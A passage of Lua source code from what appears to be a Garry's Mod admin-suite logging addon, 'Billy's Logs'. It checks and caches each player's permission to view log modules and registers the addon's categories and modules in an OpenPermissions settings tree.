	local has_permission = OpenPermissions:HasPermission(ply, "gmodadminsuite_logging/" .. module_data.Category .. "/" .. module_data.Name)
	if (GAS.Logging.Permissions.ModulePermsCache[ply] == nil) then
		GAS.Logging.Permissions.ModulePermsCache[ply] = {}
	end
	GAS.Logging.Permissions.ModulePermsCache[ply][module_data.Category .. "/" .. module_data.Name] = {os.time() + 600, has_permission}

	return has_permission
end

function GAS.Logging.Permissions:GetPermissedModules(ply)
	local permissed_modules = {}
	for _,module_data in pairs(GAS.Logging.IndexedModules) do
		if (OpenPermissions:HasPermission(ply, "gmodadminsuite_logging/" .. module_data.Category .. "/" .. module_data.Name)) then
			permissed_modules[module_data.ModuleID] = true
		end
	end
	return permissed_modules
end

local function OpenPermissions_Init()
	GAS:unhook("OpenPermissions:Ready", "logging:OpenPermissions")

	GAS.Logging.OpenPermissions = OpenPermissions:RegisterAddon("gmodadminsuite_logging", {
		Name = "Billy's Logs",
		Color = Color(178,0,0),
		Icon = "icon16/database_lightning.png",
		Logo = {
			Path = "gmodadminsuite/blogs.vtf",
			Width = 256,
			Height = 256
		}
	})

	GAS.Logging.OpenPermissions:AddToTree({
		Label   = "See Live Logs",
		Icon    = "icon16/monitor.png",
		Value   = "see_live_logs",
		Default = OpenPermissions.CHECKBOX.TICKED
	})

	GAS.Logging.OpenPermissions.RegisteredCategories = {}
	GAS.Logging.OpenPermissions.RegisteredModules = {}

	GAS.Logging.Modules:AfterRetrieveIDs(function()
		for category_name, modules in pairs(GAS.Logging:GetModules()) do
			local category
			for module_name, module_data in pairs(modules) do
				if (not category) then
					if (GAS.Logging.OpenPermissions.RegisteredCategories[category_name] ~= nil) then
						category = GAS.Logging.OpenPermissions.RegisteredCategories[category_name]
					else
						category = GAS.Logging.OpenPermissions:AddToTree({
							Label = category_name,
							Color = module_data.Colour,
							Value = category_name
						})
						GAS.Logging.OpenPermissions.RegisteredCategories[category_name] = category
					end
				end
				if (not GAS.Logging.OpenPermissions.RegisteredModules[category_name .. module_name]) then
					GAS.Logging.OpenPermissions.RegisteredModules[category_name .. module_name] = true
					category:AddToTree({
						Label = module_name,
						Color = module_data.Colour,
						Value = module_name,
						Tip = "Can see logs in " .. module_name .. "?",
					})
				end
			end
		end
	end)
end
if (OpenPermissions_Ready == true) then
	OpenPermissions_Init()
else
	GAS:hook("OpenPermissions:Ready", "logging:OpenPermissions", OpenPermissions_Init)
end